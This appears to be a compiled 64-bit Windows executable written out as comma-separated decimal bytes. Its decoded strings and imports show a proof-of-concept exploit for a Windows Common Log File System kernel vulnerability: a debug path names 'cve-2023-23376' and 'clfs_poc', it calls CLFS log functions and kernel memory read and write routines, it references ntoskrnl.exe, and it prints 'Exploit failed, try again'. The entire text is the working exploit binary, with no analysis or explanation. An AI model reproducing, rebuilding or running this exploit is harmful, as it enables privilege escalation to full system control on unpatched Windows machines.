,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,176,88,0,0,0,0,0,0,188,88,0,0,0,0,0,0,200,88,0,0,0,0,0,0,218,88,0,0,0,0,0,0,232,88,0,0,0,0,0,0,246,88,0,0,0,0,0,0,2,89,0,0,0,0,0,0,16,89,0,0,0,0,0,0,34,89,0,0,0,0,0,0,54,89,0,0,0,0,0,0,68,89,0,0,0,0,0,0,86,89,0,0,0,0,0,0,100,89,0,0,0,0,0,0,116,89,0,0,0,0,0,0,136,89,0,0,0,0,0,0,150,89,0,0,0,0,0,0,164,89,0,0,0,0,0,0,182,89,0,0,0,0,0,0,194,89,0,0,0,0,0,0,216,89,0,0,0,0,0,0,230,89,0,0,0,0,0,0,248,89,0,0,0,0,0,0,8,90,0,0,0,0,0,0,24,90,0,0,0,0,0,0,238,94,0,0,0,0,0,0,12,95,0,0,0,0,0,0,32,95,0,0,0,0,0,0,60,95,0,0,0,0,0,0,176,95,0,0,0,0,0,0,156,95,0,0,0,0,0,0,134,95,0,0,0,0,0,0,108,95,0,0,0,0,0,0,86,95,0,0,0,0,0,0,210,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,50,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,91,0,0,0,0,0,0,58,91,0,0,0,0,0,0,88,91,0,0,0,0,0,0,244,90,0,0,0,0,0,0,220,90,0,0,0,0,0,0,196,90,0,0,0,0,0,0,36,91,0,0,0,0,0,0,196,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,224,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,216,91,0,0,0,0,0,0,242,91,0,0,0,0,0,0,232,91,0,0,0,0,0,0,54,93,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,93,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,78,92,0,0,0,0,0,0,112,92,0,0,0,0,0,0,52,92,0,0,0,0,0,0,158,92,0,0,0,0,0,0,172,92,0,0,0,0,0,0,16,92,0,0,0,0,0,0,194,92,0,0,0,0,0,0,208,92,0,0,0,0,0,0,222,92,0,0,0,0,0,0,232,92,0,0,0,0,0,0,242,92,0,0,0,0,0,0,254,91,0,0,0,0,0,0,116,91,0,0,0,0,0,0,184,91,0,0,0,0,0,0,146,92,0,0,0,0,0,0,114,93,0,0,0,0,0,0,142,93,0,0,0,0,0,0,156,93,0,0,0,0,0,0,86,93,0,0,0,0,0,0,0,0,0,0,0,0,0,0,142,91,0,0,0,0,0,0,124,91,0,0,0,0,0,0,70,93,0,0,0,0,0,0,180,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,194,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,206,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,176,91,0,0,0,0,0,0,168,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,150,90,0,0,0,0,0,0,166,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,90,0,0,0,0,0,0,74,90,0,0,0,0,0,0,120,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,88,50,0,64,1,0,0,0,88,50,0,64,1,0,0,0,128,56,0,64,1,0,0,0,160,56,0,64,1,0,0,0,160,56,0,64,1,0,0,0,0,0,0,0,0,0,0,0,240,43,0,64,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,43,0,64,1,0,0,0,224,43,0,64,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,98,0,64,1,0,0,0,192,98,0,64,1,0,0,0,128,75,0,64,1,0,0,0,156,46,0,64,1,0,0,0,32,47,0,64,1,0,0,0,85,110,107,110,111,119,110,32,101,120,99,101,112,116,105,111,110,0,0,0,0,0,0,0,248,75,0,64,1,0,0,0,156,46,0,64,1,0,0,0,32,47,0,64,1,0,0,0,98,97,100,32,97,108,108,111,99,97,116,105,111,110,0,0,120,76,0,64,1,0,0,0,156,46,0,64,1,0,0,0,32,47,0,64,1,0,0,0,98,97,100,32,97,114,114,97,121,32,110,101,119,32,108,101,110,103,116,104,0,0,0,0,0,0,0,0,0,0,0,0,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,0,77,0,64,1,0,0,0,56,53,0,64,1,0,0,0,0,0,0,0,150,48,7,119,44,97,14,238,186,81,9,153,25,196,109,7,143,244,106,112,53,165,99,233,163,149,100,158,50,136,219,14,164,184,220,121,30,233,213,224,136,217,210,151,43,76,182,9,189,124,177,126,7,45,184,231,145,29,191,144,100,16,183,29,242,32,176,106,72,113,185,243,222,65,190,132,125,212,218,26,235,228,221,109,81,181,212,244,199,133,211,131,86,152,108,19,192,168,107,100,122,249,98,253,236,201,101,138,79,92,1,20,217,108,6,99,99,61,15,250,245,13,8,141,200,32,110,59,94,16,105,76,228,65,96,213,114,113,103,162,209,228,3,60,71,212,4,75,253,133,13,210,107,181,10,165,250,168,181,53,108,152,178,66,214,201,187,219,64,249,188,172,227,108,216,50,117,92,223,69,207,13,214,220,89,61,209,171,172,48,217,38,58,0,222,81,128,81,215,200,22,97,208,191,181,244,180,33,35,196,179,86,153,149,186,207,15,165,189,184,158,184,2,40,8,136,5,95,178,217,12,198,36,233,11,177,135,124,111,47,17,76,104,88,171,29,97,193,61,45,102,182,144,65,220,118,6,113,219,1,188,32,210,152,42,16,213,239,137,133,177,113,31,181,182,6,165,228,191,159,51,212,184,232,162,201,7,120,52,249,0,15,142,168,9,150,24,152,14,225,187,13,106,127,45,61,109,8,151,108,100,145,1,92,99,230,244,81,107,107,98,97,108,28,216,48,101,133,78,0,98,242,237,149,6,108,123,165,1,27,193,244,8,130,87,196,15,245,198,217,176,101,80,233,183,18,234,184,190,139,124,136,185,252,223,29,221,98,73,45,218,21,243,124,211,140,101,76,212,251,88,97,178,77,206,81,181,58,116,0,188,163,226,48,187,212,65,165,223,74,215,149,216,61,109,196,209,164,251,244,214,211,106,233,105,67,252,217,110,52,70,136,103,173,208,184,96,218,115,45,4,68,229,29,3,51,95,76,10,170,201,124,13,221,60,113,5,80,170,65,2,39,16,16,11,190,134,32,12,201,37,181,104,87,179,133,111,32,9,212,102,185,159,228,97,206,14,249,222,94,152,201,217,41,34,152,208,176,180,168,215,199,23,61,179,89,129,13,180,46,59,92,189,183,173,108,186,192,32,131,184,237,182,179,191,154,12,226,182,3,154,210,177,116,57,71,213,234,175,119,210,157,21,38,219,4,131,22,220,115,18,11,99,227,132,59,100,148,62,106,109,13,168,90,106,122,11,207,14,228,157,255,9,147,39,174,0,10,177,158,7,125,68,147,15,240,210,163,8,135,104,242,1,30,254,194,6,105,93,87,98,247,203,103,101,128,113,54,108,25,231,6,107,110,118,27,212,254,224,43,211,137,90,122,218,16,204,74,221,103,111,223,185,249,249,239,190,142,67,190,183,23,213,142,176,96,232,163,214,214,126,147,209,161,196,194,216,56,82,242,223,79,241,103,187,209,103,87,188,166,221,6,181,63,75,54,178,72,218,43,13,216,76,27,10,175,246,74,3,54,96,122,4,65,195,239,96,223,85,223,103,168,239,142,110,49,121,190,105,70,140,179,97,203,26,131,102,188,160,210,111,37,54,226,104,82,149,119,12,204,3,71,11,187,185,22,2,34,47,38,5,85,190,59,186,197,40,11,189,178,146,90,180,43,4,106,179,92,167,255,215,194,49,207,208,181,139,158,217,44,29,174,222,91,176,194,100,155,38,242,99,236,156,163,106,117,10,147,109,2,169,6,9,156,63,54,14,235,133,103,7,114,19,87,0,5,130,74,191,149,20,122,184,226,174,43,177,123,56,27,182,12,155,142,210,146,13,190,213,229,183,239,220,124,33,223,219,11,212,210,211,134,66,226,212,241,248,179,221,104,110,131,218,31,205,22,190,129,91,38,185,246,225,119,176,111,119,71,183,24,230,90,8,136,112,106,15,255,202,59,6,102,92,11,1,17,255,158,101,143,105,174,98,248,211,255,107,97,69,207,108,22,120,226,10,160,238,210,13,215,84,131,4,78,194,179,3,57,97,38,103,167,247,22,96,208,77,71,105,73,219,119,110,62,74,106,209,174,220,90,214,217,102,11,223,64,240,59,216,55,83,174,188,169,197,158,187,222,127,207,178,71,233,255,181,48,28,242,189,189,138,194,186,202,48,147,179,83,166,163,180,36,5,54,208,186,147,6,215,205,41,87,222,84,191,103,217,35,46,122,102,179,184,74,97,196,2,27,104,93,148,43,111,42,55,190,11,180,161,142,12,195,27,223,5,90,141,239,2,45,240,201,104,100,10,230,255,255,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,83,121,115,116,101,109,82,111,111,116,92,115,121,115,116,101,109,51,50,92,110,116,111,115,107,114,110,108,46,101,120,101,0,0,0,0,0,0,0,110,0,116,0,111,0,115,0,107,0,114,0,110,0,108,0,46,0,101,0,120,0,101,0,0,0,0,0,0,0,0,0,110,116,100,108,108,46,100,108,108,0,0,0,0,0,0,0,78,116,81,117,101,114,121,83,121,115,116,101,109,73,110,102,111,114,109,97,116,105,111,110,0,0,0,0,0,0,0,0,78,116,87,114,105,116,101,86,105,114,116,117,97,108,77,101,109,111,114,121,0,0,0,0,78,116,83,101,116,73,110,102,111,114,109,97,116,105,111,110,70,105,108,101,0,0,0,0,78,116,82,101,97,100,86,105,114,116,117,97,108,77,101,109,111,114,121,0,0,0,0,0,69,120,112,108,111,105,116,32,102,97,105,108,101,100,44,32,116,114,121,32,97,103,97,105,110,33,33,33,33,10,0,0,71,76,69,32,48,120,37,120,10,0,0,0,0,0,0,0,82,116,108,67,108,101,97,114,66,105,116,0,0,0,0,0,73,111,83,105,122,101,111,102,87,111,114,107,73,116,101,109,0,0,0,0,0,0,0,0,37,0,66,0,76,0,70,0,37,0,92,0,99,0,111,0,110,0,116,0,0,0,0,0,0,0,0,0,166,204,14,100,0,0,0,0,2,0,0,0,90,0,0,0,140,77,0,0,140,59,0,0,0,0,0,0,166,204,14,100,0,0,0,0,12,0,0,0,20,0,0,0,232,77,0,0,232,59,0,0,0,0,0,0,166,204,14,100,0,0,0,0,13,0,0,0,208,2,0,0,252,77,0,0,252,59,0,0,0,0,0,0,166,204,14,100,0,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,56,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,96,0,64,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,0,64,1,0,0,0,16,67,0,64,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,116,77,0,64,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,67,0,64,1,0,0,0,24,67,0,64,1,0,0,0,32,67,0,64,1,0,0,0,0,104,0,64,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,160,97,0,0,168,75,0,0,128,75,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,192,75,0,0,0,0,0,0,0,0,0,0,208,75,0,0,0,0,0,0,0,0,0,0,0,0,0,0,160,97,0,0,0,0,0,0,0,0,0,0,255,255,255,255,0,0,0,0,64,0,0,0,168,75,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,120,97,0,0,32,76,0,0,248,75,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,56,76,0,0,0,0,0,0,0,0,0,0,80,76,0,0,208,75,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,120,97,0,0,1,0,0,0,0,0,0,0,255,255,255,255,0,0,0,0,64,0,0,0,32,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,200,97,0,0,160,76,0,0,120,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,184,76,0,0,0,0,0,0,0,0,0,0,216,76,0,0,80,76,0,0,208,75,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,200,97,0,0,2,0,0,0,0,0,0,0,255,255,255,255,0,0,0,0,64,0,0,0,160,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,248,97,0,0,40,77,0,0,0,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,64,77,0,0,0,0,0,0,0,0,0,0,80,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,248,97,0,0,0,0,0,0,0,0,0,0,255,255,255,255,0,0,0,0,64,0,0,0,40,77,0,0,0,0,0,0,0,0,0,0,24,0,0,0,0,128,0,128,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,82,83,68,83,254,82,223,239,156,254,226,75,169,106,84,100,60,200,31,169,1,0,0,0,67,58,92,85,115,101,114,115,92,107,108,105,107,101,92,99,118,101,45,50,48,50,51,45,50,51,51,55,54,92,108,109,97,111,92,101,120,112,92,49,92,120,54,52,92,82,101,108,101,97,115,101,92,99,108,102,115,95,112,111,99,46,112,100,98,0,0,0,0,0,0,0,37,0,0,0,37,0,0,0,4,0,0,0,33,0,0,0,71,67,84,76,0,16,0,0,112,40,0,0,46,116,101,120,116,36,109,110,0,0,0,0,112,56,0,0,54,0,0,0,46,116,101,120,116,36,109,110,36,48,48,0,166,56,0,0,54,0,0,0,46,116,101,120,116,36,120,0,0,64,0,0,0,3,0,0,46,105,100,97,116,97,36,53,0,0,0,0,0,67,0,0,40,0,0,0,46,48,48,99,102,103,0,0,40,67,0,0,8,0,0,0,46,67,82,84,36,88,67,65,0,0,0,0,48,67,0,0,8,0,0,0,46,67,82,84,36,88,67,65,65,0,0,0,56,67,0,0,8,0,0,0,46,67,82,84,36,88,67,90,0,0,0,0,64,67,0,0,8,0,0,0,46,67,82,84,36,88,73,65,0,0,0,0,72,67,0,0,8,0,0,0,46,67,82,84,36,88,73,65,65,0,0,0,80,67,0,0,8,0,0,0,46,67,82,84,36,88,73,65,67,0,0,0,88,67,0,0,8,0,0,0,46,67,82,84,36,88,73,90,0,0,0,0,96,67,0,0,8,0,0,0,46,67,82,84,36,88,80,65,0,0,0,0,104,67,0,0,8,0,0,0,46,67,82,84,36,88,80,90,0,0,0,0,112,67,0,0,8,0,0,0,46,67,82,84,36,88,84,65,0,0,0,0,120,67,0,0,8,0,0,0,46,67,82,84,36,88,84,90,0,0,0,0,128,67,0,0,0,8,0,0,46,114,100,97,116,97,0,0,128,75,0,0,244,1,0,0,46,114,100,97,116,97,36,114,0,0,0,0,116,77,0,0,24,0,0,0,46,114,100,97,116,97,36,118,111,108,116,109,100,0,0,0,140,77,0,0,68,3,0,0,46,114,100,97,116,97,36,122,122,122,100,98,103,0,0,0,208,80,0,0,8,0,0,0,46,114,116,99,36,73,65,65,0,0,0,0,216,80,0,0,8,0,0,0,46,114,116,99,36,73,90,90,0,0,0,0,224,80,0,0,8,0,0,0,46,114,116,99,36,84,65,65,0,0,0,0,232,80,0,0,8,0,0,0,46,114,116,99,36,84,90,90,0,0,0,0,240,80,0,0,168,2,0,0,46,120,100,97,116,97,0,0,152,83,0,0,236,0,0,0,46,120,100,97,116,97,36,120,0,0,0,0,132,84,0,0,24,1,0,0,46,105,100,97,116,97,36,50,0,0,0,0,156,85,0,0,20,0,0,0,46,105,100,97,116,97,36,51,0,0,0,0,176,85,0,0,0,3,0,0,46,105,100,97,116,97,36,52,0,0,0,0,176,88,0,0,30,7,0,0,46,105,100,97,116,97,36,54,0,0,0,0,0,96,0,0,120,1,0,0,46,100,97,116,97,0,0,0,120,97,0,0,128,0,0,0,46,100,97,116,97,36,114,0,248,97,0,0,40,0,0,0,46,100,97,116,97,36,114,115,0,0,0,0,32,98,0,0,32,6,1,0,46,98,115,115,0,0,0,0,0,112,1,0,196,2,0,0,46,112,100,97,116,97,0,0,0,128,1,0,96,0,0,0,46,114,115,114,99,36,48,49,0,0,0,0,96,128,1,0,128,1,0,0,46,114,115,114,99,36,48,50,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,4,0,10,52,14,0,10,178,6,112,236,55,0,0,80,0,0,0,25,27,6,0,12,52,14,0,12,146,8,112,7,96,6,80,236,55,0,0,72,0,0,0,1,27,4,0,27,82,23,112,22,96,21,48,1,15,6,0,15,100,7,0,15,52,6,0,15,50,11,112,25,30,6,0,15,100,12,0,15,52,11,0,15,114,11,112,236,55,0,0,56,0,0,0,25,24,4,0,9,82,5,240,3,112,2,96,236,55,0,0,40,0,0,0,33,111,4,0,111,52,11,0,5,84,12,0,240,19,0,0,11,20,0,0,80,81,0,0,33,5,2,0,5,228,13,0,11,20,0,0,127,20,0,0,100,81,0,0,33,0,0,0,11,20,0,0,127,20,0,0,100,81,0,0,33,0,2,0,0,52,11,0,240,19,0,0,11,20,0,0,80,81,0,0,25,30,6,0,15,100,9,0,15,52,8,0,15,82,11,112,236,55,0,0,40,0,0,0,1,24,10,0,24,100,12,0,24,84,11,0,24,52,10,0,24,82,20,240,18,224,16,112,25,22,2,0,7,1,19,0,236,55,0,0,104,0,0,0,33,45,8,0,45,196,17,0,24,116,18,0,16,100,22,0,8,52,20,0,160,24,0,0,80,25,0,0,228,81,0,0,33,33,8,0,33,244,14,0,28,228,15,0,20,212,16,0,8,84,21,0,80,25,0,0,158,26,0,0,244,81,0,0,33,0,0,0,80,25,0,0,158,26,0,0,244,81,0,0,33,0,8,0,0,196,17,0,0,116,18,0,0,100,22,0,0,52,20,0,160,24,0,0,80,25,0,0,228,81,0,0,33,0,0,0,160,24,0,0,80,25,0,0,228,81,0,0,25,47,11,0,29,116,87,0,29,100,86,0,29,84,85,0,29,52,84,0,29,1,82,0,22,240,0,0,236,55,0,0,128,2,0,0,25,31,5,0,13,52,44,0,13,1,42,0,6,112,0,0,236,55,0,0,64,1,0,0,1,0,0,0,1,6,2,0,6,50,2,48,1,9,1,0,9,98,0,0,1,8,4,0,8,114,4,112,3,96,2,48,1,4,1,0,4,66,0,0,9,15,6,0,15,100,9,0,15,52,8,0,15,82,11,112,37,55,0,0,2,0,0,0,53,44,0,0,58,45,0,0,166,56,0,0,58,45,0,0,110,45,0,0,128,45,0,0,166,56,0,0,58,45,0,0,1,6,2,0,6,50,2,80,1,10,4,0,10,52,6,0,10,50,6,112,1,4,1,0,4,130,0,0,9,4,1,0,4,34,0,0,37,55,0,0,1,0,0,0,79,48,0,0,217,48,0,0,196,56,0,0,217,48,0,0,1,2,1,0,2,80,0,0,1,13,4,0,13,52,9,0,13,50,6,80,1,21,5,0,21,52,186,0,21,1,184,0,6,80,0,0,1,15,6,0,15,100,6,0,15,52,5,0,15,18,11,112,1,0,0,0,0,0,0,0,1,0,0,0,1,2,1,0,2,48,0,0,0,0,0,0,0,0,0,0,136,46,0,0,0,0,0,0,184,83,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,208,83,0,0,248,83,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,120,97,0,0,0,0,0,0,255,255,255,255,0,0,0,0,24,0,0,0,156,45,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,160,97,0,0,0,0,0,0,255,255,255,255,0,0,0,0,24,0,0,0,84,46,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,136,46,0,0,0,0,0,0,64,84,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,96,84,0,0,208,83,0,0,248,83,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,200,97,0,0,0,0,0,0,255,255,255,255,0,0,0,0,24,0,0,0,248,45,0,0,0,0,0,0,0,0,0,0,176,85,0,0,0,0,0,0,0,0,0,0,36,90,0,0,0,64,0,0,200,86,0,0,0,0,0,0,0,0,0,0,62,90,0,0,24,65,0,0,144,88,0,0,0,0,0,0,0,0,0,0,140,90,0,0,224,66,0,0,120,88,0,0,0,0,0,0,0,0,0,0,184,90,0,0,200,66,0,0,216,86,0,0,0,0,0,0,0,0,0,0,98,91,0,0,40,65,0,0,120,87,0,0,0,0,0,0,0,0,0,0,168,93,0,0,200,65,0,0,24,88,0,0,0,0,0,0,0,0,0,0,202,93,0,0,104,66,0,0,96,88,0,0,0,0,0,0,0,0,0,0,234,93,0,0,176,66,0,0,64,88,0,0,0,0,0,0,0,0,0,0,12,94,0,0,144,66,0,0,80,88,0,0,0,0,0,0,0,0,0,0,46,94,0,0,160,66,0,0,48,87,0,0,0,0,0,0,0,0,0,0,78,94,0,0,128,65,0,0,32,87,0,0,0,0,0,0,0,0,0,0,110,94,0,0,112,65,0,0,104,87,0,0,0,0,0,0,0,0,0,0,144,94,0,0,184,65,0,0,88,87,0,0,0,0,0,0,0,0,0,0,176,94,0,0,168,65,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,176,88,0,0,0,0,0,0,188,88,0,0,0,0,0,0,200,88,0,0,0,0,0,0,218,88,0,0,0,0,0,0,232,88,0,0,0,0,0,0,246,88,0,0,0,0,0,0,2,89,0,0,0,0,0,0,16,89,0,0,0,0,0,0,34,89,0,0,0,0,0,0,54,89,0,0,0,0,0,0,68,89,0,0,0,0,0,0,86,89,0,0,0,0,0,0,100,89,0,0,0,0,0,0,116,89,0,0,0,0,0,0,136,89,0,0,0,0,0,0,150,89,0,0,0,0,0,0,164,89,0,0,0,0,0,0,182,89,0,0,0,0,0,0,194,89,0,0,0,0,0,0,216,89,0,0,0,0,0,0,230,89,0,0,0,0,0,0,248,89,0,0,0,0,0,0,8,90,0,0,0,0,0,0,24,90,0,0,0,0,0,0,238,94,0,0,0,0,0,0,12,95,0,0,0,0,0,0,32,95,0,0,0,0,0,0,60,95,0,0,0,0,0,0,176,95,0,0,0,0,0,0,156,95,0,0,0,0,0,0,134,95,0,0,0,0,0,0,108,95,0,0,0,0,0,0,86,95,0,0,0,0,0,0,210,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,50,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,91,0,0,0,0,0,0,58,91,0,0,0,0,0,0,88,91,0,0,0,0,0,0,244,90,0,0,0,0,0,0,220,90,0,0,0,0,0,0,196,90,0,0,0,0,0,0,36,91,0,0,0,0,0,0,196,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,224,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,216,91,0,0,0,0,0,0,242,91,0,0,0,0,0,0,232,91,0,0,0,0,0,0,54,93,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,93,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,78,92,0,0,0,0,0,0,112,92,0,0,0,0,0,0,52,92,0,0,0,0,0,0,158,92,0,0,0,0,0,0,172,92,0,0,0,0,0,0,16,92,0,0,0,0,0,0,194,92,0,0,0,0,0,0,208,92,0,0,0,0,0,0,222,92,0,0,0,0,0,0,232,92,0,0,0,0,0,0,242,92,0,0,0,0,0,0,254,91,0,0,0,0,0,0,116,91,0,0,0,0,0,0,184,91,0,0,0,0,0,0,146,92,0,0,0,0,0,0,114,93,0,0,0,0,0,0,142,93,0,0,0,0,0,0,156,93,0,0,0,0,0,0,86,93,0,0,0,0,0,0,0,0,0,0,0,0,0,0,142,91,0,0,0,0,0,0,124,91,0,0,0,0,0,0,70,93,0,0,0,0,0,0,180,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,194,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,206,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,176,91,0,0,0,0,0,0,168,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,150,90,0,0,0,0,0,0,166,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,90,0,0,0,0,0,0,74,90,0,0,0,0,0,0,120,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,121,4,82,101,97,100,70,105,108,101,0,0,37,6,87,114,105,116,101,70,105,108,101,0,50,5,83,101,116,70,105,108,101,80,111,105,110,116,101,114,0,0,206,0,67,114,101,97,116,101,70,105,108,101,87,0,137,0,67,108,111,115,101,72,97,110,100,108,101,0,85,3,72,101,97,112,70,114,101,101,0,0,224,0,67,114,101,97,116,101,80,105,112,101,0,0,190,2,71,101,116,80,114,111,99,101,115,115,72,101,97,112,0,0,32,2,71,101,116,67,117,114,114,101,110,116,80,114,111,99,101,115,115,0,209,3,76,111,99,97,108,65,108,108,111,99,0,0,50,1,68,117,112,108,105,99,97,116,101,72,97,110,100,108,101,0,18,4,79,112,101,110,80,114,111,99,101,115,115,0,106,2,71,101,116,76,97,115,116,69,114,114,111,114,0,0,36,2,71,101,116,67,117,114,114,101,110,116,84,104,114,101,97,100,0,0,57,3,71,108,111,98,97,108,65,108,108,111,99,0,25,1,68,101,108,101,116,101,70,105,108,101,87,0,184,2,71,101,116,80,114,111,99,65,100,100,114,101,115,115,0,0,214,3,76,111,99,97,108,70,114,101,101,0,33,2,71,101,116,67,117,114,114,101,110,116,80,114,111,99,101,115,115,73,100,0,180,1,70,114,101,101,76,105,98,114,97,114,121,0,202,3,76,111,97,100,76,105,98,114,97,114,121,69,120,87,0,0,217,5,86,105,114,116,117,97,108,65,108,108,111,99,0,0,200,3,76,111,97,100,76,105,98,114,97,114,121,65,0,0,81,3,72,101,97,112,65,108,108,111,99,0,75,69,82,78,69,76,51,50,46,100,108,108,0,0,234,3,119,115,112,114,105,110,116,102,87,0,85,83,69,82,51,50,46,100,108,108,0,0,243,2,82,116,108,67,97,112,116,117,114,101,67,111,110,116,101,120,116,0,233,4,82,116,108,76,111,111,107,117,112,70,117,110,99,116,105,111,110,69,110,116,114,121,0,0,40,6,82,116,108,86,105,114,116,117,97,108,85,110,119,105,110,100,0,0,110,116,100,108,108,46,100,108,108,0,9,0,67,114,101,97,116,101,76,111,103,70,105,108,101,0,0,0,65,100,100,76,111,103,67,111,110,116,97,105,110,101,114,0,99,108,102,115,119,51,50,46,100,108,108,0,8,0,95,95,67,95,115,112,101,99,105,102,105,99,95,104,97,110,100,108,101,114,0,0,33,0,95,95,115,116,100,95,101,120,99,101,112,116,105,111,110,95,99,111,112,121,0,0,34,0,95,95,115,116,100,95,101,120,99,101,112,116,105,111,110,95,100,101,115,116,114,111,121,0,1,0,95,67,120,120,84,104,114,111,119,69,120,99,101,112,116,105,111,110,0,0,27,0,95,95,99,117,114,114,101,110,116,95,101,120,99,101,112,116,105,111,110,0,28,0,95,95,99,117,114,114,101,110,116,95,101,120,99,101,112,116,105,111,110,95,99,111,110,116,101,120,116,0,62,0,109,101,109,115,101,116,0,0,86,67,82,85,78,84,73,77,69,49,52,48,46,100,108,108,0,0,85,0,101,120,105,116,0,0,0,0,95,95,97,99,114,116,95,105,111,98,95,102,117,110,99,0,3,0,95,95,115,116,100,105,111,95,99,111,109,109,111,110,95,118,102,112,114,105,110,116,102,0,29,0,115,114,97,110,100,0,27,0,114,97,110,100,0,0,102,0,115,121,115,116,101,109,0,0,42,0,95,115,116,114,105,99,109,112,0,0,48,0,95,116,105,109,101,54,52,0,24,0,102,114,101,101,0,0,80,0,97,116,111,105,0,0,25,0,109,97,108,108,111,99,0,0,8,0,95,99,97,108,108,110,101,119,104,0,64,0,95,115,101,104,95,102,105,108,116,101,114,95,101,120,101,0,66,0,95,115,101,116,95,97,112,112,95,116,121,112,101,0,9,0,95,95,115,101,116,117,115,101,114,109,97,116,104,101,114,114,0,0,24,0,95,99,111,110,102,105,103,117,114,101,95,110,97,114,114,111,119,95,97,114,103,118,0,0,51,0,95,105,110,105,116,105,97,108,105,122,101,95,110,97,114,114,111,119,95,101,110,118,105,114,111,110,109,101,110,116,0,0,40,0,95,103,101,116,95,105,110,105,116,105,97,108,95,110,97,114,114,111,119,95,101,110,118,105,114,111,110,109,101,110,116,0,54,0,95,105,110,105,116,116,101,114,109,0,55,0,95,105,110,105,116,116,101,114,109,95,101,0,35,0,95,101,120,105,116,0,84,0,95,115,101,116,95,102,109,111,100,101,0,0,4,0,95,95,112,95,95,95,97,114,103,99,0,0,5,0,95,95,112,95,95,95,97,114,103,118,0,0,22,0,95,99,101,120,105,116,0,0,21,0,95,99,95,101,120,105,116,0,61,0,95,114,101,103,105,115,116,101,114,95,116,104,114,101,97,100,95,108,111,99,97,108,95,101,120,101,95,97,116,101,120,105,116,95,99,97,108,108,98,97,99,107,0,0,8,0,95,99,111,110,102,105,103,116,104,114,101,97,100,108,111,99,97,108,101,0,22,0,95,115,101,116